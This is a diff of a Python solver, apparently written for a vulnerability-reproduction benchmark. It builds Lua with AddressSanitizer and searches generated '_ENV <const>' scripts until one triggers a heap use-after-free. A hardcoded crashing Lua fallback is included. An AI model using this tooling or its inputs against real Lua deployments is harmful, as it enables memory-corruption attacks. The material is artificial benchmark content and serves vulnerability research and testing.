@@ -1,301 +1,413 @@
 import os
 import re
-import io
+import sys
 import tarfile
 import tempfile
 import subprocess
 import shutil
-from typing import List, Optional, Tuple
-
-
-def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
-    def is_within_directory(directory: str, target: str) -> bool:
-        abs_directory = os.path.abspath(directory)
-        abs_target = os.path.abspath(target)
-        return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])
-
-    with tarfile.open(tar_path, "r:*") as tar:
-        for member in tar.getmembers():
-            member_path = os.path.join(dst_dir, member.name)
-            if not is_within_directory(dst_dir, member_path):
-                continue
-            tar.extract(member, dst_dir)
-
-
-def _find_lua_src_dir(extracted_root: str) -> Optional[str]:
-    # Heuristic: directory containing several core Lua C files
-    must_have = {"lparser.c", "llex.c", "lapi.c", "lvm.c"}
-    best = None
-    best_score = 0
-    for dirpath, dirnames, filenames in os.walk(extracted_root):
-        fnset = set(filenames)
-        score = len(must_have & fnset)
-        if score > best_score:
-            best_score = score
-            best = dirpath
-            if best_score == len(must_have):
-                # Prefer exact src dir if it also has headers
-                if "lua.h" in fnset and "lauxlib.h" in fnset and "lualib.h" in fnset:
-                    return best
-    return best if best_score >= 2 else None
-
-
-def _pick_compiler() -> str:
-    for c in ("clang", "cc", "gcc"):
-        p = shutil.which(c)
-        if p:
-            return p
-    return "cc"
-
-
-def _build_asan_harness(src_dir: str, out_dir: str) -> Optional[str]:
-    cc = _pick_compiler()
-    harness_c = r'''
-#include "lua.h"
-#include "lauxlib.h"
-#include "lualib.h"
-#include <stdio.h>
-#include <stdlib.h>
-
-static unsigned char* read_all_stdin(size_t* outlen) {
-  size_t cap = 1 << 16;
-  size_t n = 0;
-  unsigned char* buf = (unsigned char*)malloc(cap);
-  if (!buf) return NULL;
-  for (;;) {
-    size_t want = cap - n;
-    size_t r = fread(buf + n, 1, want, stdin);
-    n += r;
-    if (r < want) {
-      if (feof(stdin)) break;
-      if (ferror(stdin)) { free(buf); return NULL; }
-    }
-    if (n == cap) {
-      size_t ncap = cap * 2;
-      unsigned char* nbuf = (unsigned char*)realloc(buf, ncap);
-      if (!nbuf) { free(buf); return NULL; }
-      buf = nbuf; cap = ncap;
-    }
-  }
-  *outlen = n;
-  return buf;
-}
-
-int main(void) {
-  size_t len = 0;
-  unsigned char* buf = read_all_stdin(&len);
-  if (!buf) return 1;
-
-  lua_State* L = luaL_newstate();
-  if (!L) { free(buf); return 1; }
-  luaL_openlibs(L);
-
-  int status = luaL_loadbuffer(L, (const char*)buf, len, "poc");
-  if (status == LUA_OK) status = lua_pcall(L, 0, 0, 0);
-
-  lua_close(L);
-  free(buf);
-  return status == LUA_OK ? 0 : 1;
-}
-'''
-    harness_path = os.path.join(out_dir, "poc_harness.c")
-    with open(harness_path, "w", encoding="utf-8") as f:
-        f.write(harness_c)
-
-    c_files = []
-    try:
-        for name in os.listdir(src_dir):
-            if not name.endswith(".c"):
-                continue
-            if name in ("lua.c", "luac.c", "ltests.c", "onelua.c", "minilua.c"):
-                continue
-            c_files.append(os.path.join(src_dir, name))
-    except Exception:
-        return None
-
-    if not c_files:
-        return None
-
-    out_bin = os.path.join(out_dir, "poc_lua")
-
-    cflags = [
-        "-O0", "-g",
-        "-fsanitize=address",
-        "-fno-omit-frame-pointer",
-        "-I", src_dir,
-        "-DLUA_USE_LINUX",
-        "-DLUA_USE_POSIX",
-        "-DLUA_USE_DLOPEN",
-        "-D_FORTIFY_SOURCE=0",
-    ]
-    ldflags = ["-fsanitize=address", "-ldl", "-lm"]
-
-    cmd = [cc, harness_path] + c_files + cflags + ["-o", out_bin] + ldflags
-    try:
-        r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=120)
-    except Exception:
-        return None
-    if r.returncode != 0:
-        return None
-    if not (os.path.isfile(out_bin) and os.access(out_bin, os.X_OK)):
-        return None
-    return out_bin
-
-
-def _run_and_is_asan_crash(exe: str, script: bytes) -> bool:
-    env = os.environ.copy()
-    env["ASAN_OPTIONS"] = "detect_leaks=0:halt_on_error=1:abort_on_error=1:exitcode=86"
-    env["UBSAN_OPTIONS"] = "halt_on_error=1:abort_on_error=1:exitcode=86"
-    try:
-        p = subprocess.run(
-            [exe],
-            input=script,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.PIPE,
-            env=env,
-            timeout=3,
-        )
-    except subprocess.TimeoutExpired:
-        return False
-    except Exception:
-        return False
-    err = p.stderr.decode("utf-8", "replace")
-    if "AddressSanitizer" in err:
-        return True
-    if "heap-use-after-free" in err:
-        return True
-    return False
-
-
-def _var_list(prefix: str, n: int) -> str:
-    return ",".join(f"{prefix}{i}" for i in range(n))
-
-
-def _gen_script(nvars: int, nblocks: int, inner: bool, inner_env: bool, do_global_assign: bool) -> str:
-    vl = _var_list("a", nvars)
-    parts = []
-    # Keep a space before '<const>' for max parser compatibility
-    parts.append("local _ENV <const> = _G;")
-    for _ in range(nblocks):
-        parts.append(f"do local {vl} end;")
-    if do_global_assign:
-        parts.append("x=1;")
-    if inner:
-        inner_parts = []
-        if inner_env:
-            inner_parts.append("local _ENV <const> = _G;")
-        inner_parts.append("print(1);")
-        if do_global_assign:
-            inner_parts.append("y=2;")
-        parts.append("local function f()" + "".join(inner_parts) + "end;f();")
-    parts.append("print(2);")
-    return "".join(parts) + "\n"
-
-
-def _fallback_poc() -> bytes:
-    # Reasonably small, stresses local-variable bookkeeping without exceeding active local limit.
-    s = _gen_script(nvars=140, nblocks=2, inner=True, inner_env=False, do_global_assign=True)
-    return s.encode("utf-8", "strict")
-
-
-def _collect_lua_candidates_from_tree(root: str, max_files: int = 200) -> List[bytes]:
-    out = []
-    cnt = 0
-    for dirpath, dirnames, filenames in os.walk(root):
-        for fn in filenames:
-            if not fn.endswith(".lua"):
-                continue
-            p = os.path.join(dirpath, fn)
-            try:
-                st = os.stat(p)
-                if st.st_size <= 0 or st.st_size > 20000:
-                    continue
-                with open(p, "rb") as f:
-                    data = f.read()
-                if b"_ENV" in data and b"const" in data and b"<" in data and b">" in data:
-                    out.append(data)
-                    cnt += 1
-                    if cnt >= max_files:
-                        return out
-            except Exception:
-                continue
-    return out
+from pathlib import Path
+from typing import Optional, Tuple, List
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        fallback = _fallback_poc()
-
-        # Try to build an ASan harness and discover a crashing input automatically.
+        fallback = b"do local _ENV<const>=setmetatable({},{__index=_G});collectgarbage('collect');x=1 end\n"
         try:
-            with tempfile.TemporaryDirectory() as td:
-                extracted = os.path.join(td, "src")
-                os.mkdir(extracted)
-                try:
-                    _safe_extract_tar(src_path, extracted)
-                except Exception:
+            with tempfile.TemporaryDirectory(prefix="poc_lua_uaf_") as td:
+                root = self._prepare_source(src_path, td)
+                if root is None:
                     return fallback
 
-                src_dir = _find_lua_src_dir(extracted)
-                if not src_dir:
+                lua_bin = self._build_lua_asan(root, td)
+                if lua_bin is None:
                     return fallback
 
-                build_dir = os.path.join(td, "build")
-                os.mkdir(build_dir)
-                exe = _build_asan_harness(src_dir, build_dir)
-                if not exe:
+                script = self._find_poc(lua_bin, root, td)
+                if script is None:
                     return fallback
-
-                # First, try any existing lua testcases mentioning _ENV <const>
-                for cand in _collect_lua_candidates_from_tree(extracted):
-                    if _run_and_is_asan_crash(exe, cand):
-                        return cand
-
-                # Systematic search over a few patterns.
-                patterns: List[Tuple[bool, bool, bool]] = [
-                    (False, False, False),
-                    (False, False, True),
-                    (True, False, False),
-                    (True, False, True),
-                    (True, True, False),
-                    (True, True, True),
-                ]
-
-                best_script = None
-                best_len = None
-
-                for nblocks in (1, 2, 3):
-                    for (inner, inner_env, do_assign) in patterns:
-                        # Try increasing nvars until crash; then binary search down.
-                        crashed_at = None
-                        for nvars in range(5, 191, 5):
-                            script = _gen_script(nvars, nblocks, inner, inner_env, do_assign)
-                            sb = script.encode("utf-8", "strict")
-                            if _run_and_is_asan_crash(exe, sb):
-                                crashed_at = nvars
-                                break
-                        if crashed_at is None:
-                            continue
-
-                        lo, hi = 1, crashed_at
-                        while lo < hi:
-                            mid = (lo + hi) // 2
-                            script = _gen_script(mid, nblocks, inner, inner_env, do_assign)
-                            sb = script.encode("utf-8", "strict")
-                            if _run_and_is_asan_crash(exe, sb):
-                                hi = mid
-                            else:
-                                lo = mid + 1
-
-                        final_script = _gen_script(lo, nblocks, inner, inner_env, do_assign).encode("utf-8", "strict")
-                        L = len(final_script)
-                        if best_len is None or L < best_len:
-                            best_len = L
-                            best_script = final_script
-
-                if best_script is not None:
-                    return best_script
+                if not script.endswith("\n"):
+                    script += "\n"
+                return script.encode("utf-8", errors="ignore")
         except Exception:
-            pass
+            return fallback
 
-        return fallback
+    def _prepare_source(self, src_path: str, td: str) -> Optional[Path]:
+        p = Path(src_path)
+        if p.is_dir():
+            root = self._find_lua_root(p)
+            return root
+
+        if not p.is_file():
+            return None
+
+        extract_dir = Path(td) / "src"
+        extract_dir.mkdir(parents=True, exist_ok=True)
+
+        try:
+            with tarfile.open(p, "r:*") as tf:
+                def is_within_directory(directory: Path, target: Path) -> bool:
+                    try:
+                        directory = directory.resolve()
+                        target = target.resolve()
+                        return str(target).startswith(str(directory) + os.sep) or target == directory
+                    except Exception:
+                        return False
+
+                members = tf.getmembers()
+                for m in members:
+                    name = m.name
+                    if not name or name.startswith("/") or ".." in Path(name).parts:
+                        continue
+                    target = extract_dir / name
+                    if not is_within_directory(extract_dir, target):
+                        continue
+                    tf.extract(m, path=extract_dir)
+        except Exception:
+            return None
+
+        root = self._find_lua_root(extract_dir)
+        return root
+
+    def _find_lua_root(self, base: Path) -> Optional[Path]:
+        base = base.resolve()
+        # Prefer closest directory that contains src/lua.c and src/lauxlib.c
+        candidates = []
+        for dirpath, dirnames, filenames in os.walk(base):
+            dp = Path(dirpath)
+            if (dp / "src" / "lua.c").is_file() and (dp / "src" / "lauxlib.c").is_file():
+                candidates.append(dp)
+        if candidates:
+            candidates.sort(key=lambda x: len(str(x)))
+            return candidates[0]
+        # Fallback: directory containing lua.c directly
+        for dirpath, dirnames, filenames in os.walk(base):
+            dp = Path(dirpath)
+            if (dp / "lua.c").is_file() and (dp / "lauxlib.c").is_file():
+                return dp
+        return None
+
+    def _build_lua_asan(self, root: Path, td: str) -> Optional[Path]:
+        # Try make-based build first; if fails, do manual compile.
+        env = os.environ.copy()
+        cc = shutil.which("clang") or shutil.which("gcc") or shutil.which("cc")
+        if not cc:
+            return None
+
+        asan_cflags = "-O1 -g -fno-omit-frame-pointer -fsanitize=address -fno-common"
+        asan_ldflags = "-fsanitize=address"
+        env["CC"] = cc
+        env["MYCFLAGS"] = asan_cflags
+        env["MYLDFLAGS"] = asan_ldflags
+        env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:disable_coredump=1")
+        env["UBSAN_OPTIONS"] = env.get("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1")
+
+        makefile = root / "Makefile"
+        if makefile.is_file() and shutil.which("make"):
+            for target in ("posix", "generic", "linux"):
+                if self._run_cmd(["make", "clean"], cwd=root, env=env, timeout=120) is None:
+                    pass
+                r = self._run_cmd(["make", "-j8", target], cwd=root, env=env, timeout=300)
+                if r and r.returncode == 0:
+                    lua_bin = self._find_lua_binary(root)
+                    if lua_bin:
+                        if self._run_cmd([str(lua_bin), "-e", "print(1)"], cwd=root, env=env, timeout=5):
+                            return lua_bin
+
+        # Manual compile fallback
+        lua_bin = Path(td) / "lua_asan_bin"
+        ok = self._manual_build_lua(root, lua_bin, cc, asan_cflags, asan_ldflags, env)
+        if ok:
+            if self._run_cmd([str(lua_bin), "-e", "print(1)"], cwd=root, env=env, timeout=5):
+                return lua_bin
+        return None
+
+    def _find_lua_binary(self, root: Path) -> Optional[Path]:
+        candidates = []
+        for rel in ("src/lua", "lua", "bin/lua", "src/lua.exe", "lua.exe", "bin/lua.exe"):
+            p = root / rel
+            if p.is_file() and os.access(p, os.X_OK):
+                candidates.append(p)
+        if candidates:
+            candidates.sort(key=lambda x: (0 if "src" in str(x) else 1, len(str(x))))
+            return candidates[0]
+        # Search
+        for dirpath, dirnames, filenames in os.walk(root):
+            for fn in ("lua", "lua.exe"):
+                p = Path(dirpath) / fn
+                if p.is_file() and os.access(p, os.X_OK):
+                    candidates.append(p)
+        if not candidates:
+            return None
+        candidates.sort(key=lambda x: (0 if (x.parent.name == "src") else 1, len(str(x))))
+        return candidates[0]
+
+    def _manual_build_lua(
+        self,
+        root: Path,
+        out_bin: Path,
+        cc: str,
+        cflags: str,
+        ldflags: str,
+        env: dict,
+    ) -> bool:
+        srcdir = root / "src"
+        if not srcdir.is_dir():
+            srcdir = root
+        if not (srcdir / "lua.c").is_file():
+            return False
+
+        core = [
+            "lapi.c", "lcode.c", "lctype.c", "ldebug.c", "ldo.c", "ldump.c", "lfunc.c", "lgc.c",
+            "llex.c", "lmem.c", "lobject.c", "lopcodes.c", "lparser.c", "lstate.c", "lstring.c",
+            "ltable.c", "ltm.c", "lundump.c", "lvm.c", "lzio.c",
+        ]
+        libs = [
+            "lauxlib.c", "lbaselib.c", "lcorolib.c", "ldblib.c", "liolib.c", "lmathlib.c",
+            "loslib.c", "lstrlib.c", "ltablib.c", "lutf8lib.c", "loadlib.c", "linit.c",
+        ]
+        files = []
+        for f in ["lua.c"] + core + libs:
+            fp = srcdir / f
+            if fp.is_file():
+                files.append(str(fp))
+        if len(files) < 10:
+            # fallback: compile all .c except luac.c and test helpers
+            allc = [p for p in srcdir.glob("*.c")]
+            picked = []
+            for p in allc:
+                n = p.name
+                if n == "luac.c":
+                    continue
+                if n.startswith("ltests") or n.startswith("ltest"):
+                    continue
+                picked.append(str(p))
+            if not picked:
+                return False
+            files = picked
+
+        includes = f"-I{srcdir}"
+        defs = "-DLUA_USE_POSIX -DLUA_USE_DLOPEN"
+        cmd = [cc] + cflags.split() + defs.split() + includes.split() + files + ldflags.split() + ["-lm", "-ldl", "-o", str(out_bin)]
+        r = self._run_cmd(cmd, cwd=root, env=env, timeout=300)
+        return bool(r and r.returncode == 0 and out_bin.is_file() and os.access(out_bin, os.X_OK))
+
+    def _run_cmd(self, cmd, cwd: Path, env: dict, timeout: int) -> Optional[subprocess.CompletedProcess]:
+        try:
+            return subprocess.run(
+                cmd,
+                cwd=str(cwd),
+                env=env,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                timeout=timeout,
+                check=False,
+            )
+        except Exception:
+            return None
+
+    def _run_lua(self, lua_bin: Path, cwd: Path, script: str, timeout: int = 2) -> Tuple[int, str, str]:
+        env = os.environ.copy()
+        env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "detect_leaks=0:abort_on_error=1:disable_coredump=1")
+        env["UBSAN_OPTIONS"] = env.get("UBSAN_OPTIONS", "halt_on_error=1:abort_on_error=1")
+        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".lua", encoding="utf-8") as f:
+            f.write(script)
+            fname = f.name
+        try:
+            r = subprocess.run(
+                [str(lua_bin), fname],
+                cwd=str(cwd),
+                env=env,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                timeout=timeout,
+                check=False,
+            )
+            out = r.stdout.decode("utf-8", errors="ignore")
+            err = r.stderr.decode("utf-8", errors="ignore")
+            return r.returncode, out, err
+        except subprocess.TimeoutExpired:
+            return -999, "", "TIMEOUT"
+        finally:
+            try:
+                os.unlink(fname)
+            except Exception:
+                pass
+
+    def _is_asan_uaf(self, stderr: str) -> bool:
+        s = stderr
+        if "AddressSanitizer" not in s and "Sanitizer" not in s:
+            return False
+        if "use-after-free" in s:
+            return True
+        if "heap-use-after-free" in s:
+            return True
+        return False
+
+    def _find_repo_snippets(self, root: Path, max_files: int = 2000) -> List[str]:
+        res = []
+        count = 0
+        for dirpath, dirnames, filenames in os.walk(root):
+            dp = Path(dirpath)
+            for fn in filenames:
+                if count >= max_files:
+                    return res
+                if not (fn.endswith(".lua") or fn.endswith(".txt") or fn.endswith(".md") or fn.endswith(".c") or fn.endswith(".h")):
+                    continue
+                fp = dp / fn
+                try:
+                    st = fp.stat()
+                    if st.st_size > 200_000:
+                        continue
+                    data = fp.read_bytes()
+                except Exception:
+                    continue
+                count += 1
+                try:
+                    txt = data.decode("utf-8", errors="ignore")
+                except Exception:
+                    continue
+                if "_ENV" in txt and "<const>" in txt and "local" in txt:
+                    # Try to extract the smallest region containing it (simple heuristic)
+                    idx = txt.find("_ENV")
+                    start = max(0, idx - 800)
+                    end = min(len(txt), idx + 1200)
+                    snippet = txt[start:end]
+                    # Ensure it's at least syntactically likely: add wrapper do-end around it
+                    snippet2 = "do\n" + snippet + "\nend\n"
+                    res.append(snippet2)
+        return res
+
+    def _gen_locals(self, n: int) -> str:
+        if n <= 0:
+            return ""
+        names = [f"a{i}" for i in range(n)]
+        return "local " + ",".join(names) + ";"
+
+    def _templates(self) -> List[Tuple[str, callable]]:
+        def t0(n: int) -> str:
+            return "do local _ENV<const>=setmetatable({},{__index=_G});collectgarbage('collect');x=1 end"
+
+        def t1(n: int) -> str:
+            return "do local _ENV<const>=setmetatable({},{__index=_G});" + self._gen_locals(n) + "collectgarbage('collect');x=1 end"
+
+        def t2(n: int) -> str:
+            # Keep function alive across scope and call later
+            return "local f;do local _ENV<const>=setmetatable({},{__index=_G});" + self._gen_locals(n) + "f=function()return x end end;collectgarbage('collect');f()"
+
+        def t3(n: int) -> str:
+            # Inner scope closes _ENV before function returns
+            return ("local function g()local f;do local _ENV<const>=setmetatable({},{__index=_G});"
+                    + self._gen_locals(n) +
+                    "f=function()return x end end;collectgarbage('collect');return f() end;g()")
+
+        def t4(n: int) -> str:
+            # Load to force separate compilation
+            inner = "do local _ENV<const>=setmetatable({},{__index=_G});" + self._gen_locals(n) + "collectgarbage('collect');x=1 end"
+            inner = inner.replace("\\", "\\\\").replace("'", "\\'")
+            return "local s='" + inner + "';assert(load(s))()"
+
+        def t5(n: int) -> str:
+            # Memory pressure + GC
+            pressure = "for i=1," + str(max(1, n)) + " do local s=string.rep('a',1024) end;"
+            return "do local _ENV<const>=setmetatable({},{__index=_G});" + pressure + "collectgarbage('collect');x=1 end"
+
+        def t6(n: int) -> str:
+            # Use <close> variable too
+            meta = "setmetatable({},{__close=function()end})"
+            return ("do local _ENV<const>=setmetatable({},{__index=_G});"
+                    "local c<close>=" + meta + ";"
+                    + self._gen_locals(n) +
+                    "collectgarbage('collect');x=1 end")
+
+        return [
+            ("t0", t0),
+            ("t2", t2),
+            ("t3", t3),
+            ("t1", t1),
+            ("t4", t4),
+            ("t5", t5),
+            ("t6", t6),
+        ]
+
+    def _find_poc(self, lua_bin: Path, root: Path, td: str) -> Optional[str]:
+        # First try short templates with small n; then scale n.
+        ns_small = [0, 1, 2, 3, 4, 5, 8, 13, 21]
+        ns_big = [34, 55, 89, 144, 233, 377, 610, 800, 1000]
+        templates = self._templates()
+
+        def test_script(script: str) -> bool:
+            rc, out, err = self._run_lua(lua_bin, root, script, timeout=2)
+            if rc == -999:
+                return False
+            return self._is_asan_uaf(err)
+
+        # Try repository snippets (might include real reproducer)
+        snippets = self._find_repo_snippets(root)
+        # Test small snippets first
+        snippets.sort(key=lambda s: len(s))
+        for snip in snippets[:40]:
+            if test_script(snip):
+                # Try to minify by stripping wrapper if possible
+                s = self._minify_lua(snip)
+                if test_script(s):
+                    return s
+                return snip
+
+        # Systematic template search
+        found: Optional[Tuple[str, int, str]] = None
+        for name, gen in templates:
+            for n in ns_small + ns_big:
+                script = gen(n)
+                if test_script(script):
+                    found = (name, n, script)
+                    break
+            if found:
+                break
+
+        if not found:
+            # Deterministic random-ish variations around patterns
+            for n in [16, 32, 48, 64, 96, 128, 192, 256, 384, 512, 768, 1024]:
+                script = ("local function h()do local _ENV<const>=setmetatable({},{__index=_G});"
+                          + self._gen_locals(n) +
+                          "collectgarbage('collect');x=1 end end;h()")
+                if test_script(script):
+                    found = ("hwrap", n, script)
+                    break
+
+        if not found:
+            return None
+
+        name, n0, script0 = found
+
+        # Attempt to minimize parameter n if template used it
+        gen_map = {nm: g for nm, g in templates}
+        if name in gen_map:
+            gen = gen_map[name]
+            lo, hi = 0, n0
+            best_n = n0
+            while lo <= hi:
+                mid = (lo + hi) // 2
+                s = gen(mid)
+                if test_script(s):
+                    best_n = mid
+                    hi = mid - 1
+                else:
+                    lo = mid + 1
+            script0 = gen(best_n)
+
+        script0 = self._minify_lua(script0)
+        return script0
+
+    def _minify_lua(self, s: str) -> str:
+        # Very conservative minification (avoid touching strings)
+        # Remove leading/trailing whitespace per line and collapse blank lines.
+        lines = s.splitlines()
+        lines = [ln.strip() for ln in lines if ln.strip() != ""]
+        s2 = ";".join(lines)
+        # Collapse multiple semicolons
+        s2 = re.sub(r";{2,}", ";", s2)
+        # Remove spaces around some tokens (safe-ish)
+        s2 = re.sub(r"\s+", " ", s2)
+        s2 = s2.replace(" ;", ";").replace("; ", ";")
+        s2 = s2.replace(" do ", " do ").replace(" end", " end")
+        return s2.strip() + "\n"
